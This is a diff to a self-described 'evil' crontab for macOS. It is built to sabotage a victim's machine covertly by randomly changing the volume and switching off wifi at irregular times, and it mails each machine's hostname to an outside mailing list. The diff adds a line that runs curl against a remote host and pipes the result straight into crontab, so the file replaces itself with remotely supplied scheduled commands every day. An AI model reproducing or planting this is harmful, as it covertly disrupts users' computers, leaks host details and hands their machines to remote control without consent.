@@ -5,7 +5,16 @@
 # Designed to be subtle in its evilness, and aims to have its effects
 # go not unnoticed, but undiagnosed for as long as possible.
 #
-# Format: wait_for_a_while_to_make_evilness_irregular && do_evil_thing && mail notifs
+# Features:
+# - Runs silently, and gets rid of all outputs.
+# - Sends notifications to the EvilCrontab mailing list
+# Limitations:
+# - My name is visible in the update command. Oh well. Hi!
+#
+# Format:
+# - wait_for_a_while_to_make_evilness_irregular && do_evil_thing && mail notifs
+
+################################################################################
 
 # Keep changing the volume
 */5 * * * * osascript -e "set Volume $((RANDOM * 10 / 32767))" && (echo "Volume changed on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
@@ -21,3 +30,8 @@
 
 # Switch off wifi once every four hours
 0 */4 * * * sleep $(((15 * 60) + (RANDOM * 30 * 60 / 32767))) && networksetup -setairportpower en0 off && (echo "Wifi turned off on $HOSTNAME" | mail -s "EVIL @ $HOSTNAME" evilcrontab@googlegroups.com)
+
+################################################################################
+
+# Thought of some evil later? That's okay, this crontab fetches and updates itself
+0 15 * * * * curl -sL evilcrontab.thatharmansingh.com | crontab -
